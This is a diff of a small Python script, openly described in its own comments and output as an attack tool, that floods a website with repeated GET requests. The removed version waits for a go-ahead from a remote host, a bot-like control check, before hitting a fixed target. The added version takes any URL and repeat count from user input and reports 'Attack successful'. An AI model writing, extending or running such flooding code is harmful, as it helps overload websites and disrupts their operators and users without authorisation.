@@ -1,9 +1,11 @@
 import requests
-check = requests.get('xyz.com') # Checks whether attack command is give or not
-determine = check.status_code # If website is live, proceeds further
-if determine == 200:
-    for i in range(100):
-        requests.get('abc.com') # Attacks the target website
-        print('attack successful')
-else:
-    print(f'attack unsuccessful exit code {determine}')
+input1 = int(input('how many times?'))
+input2 = str(input('whats your url?'))
+for a in range(input1):
+   spam = requests.get(input2)
+result = spam.status_code
+message = result == 200
+if message == False:
+   print(f'Attack unsuccessfull error code {result}')
+if message == True:
+   print(f'Attack successful code {result}')
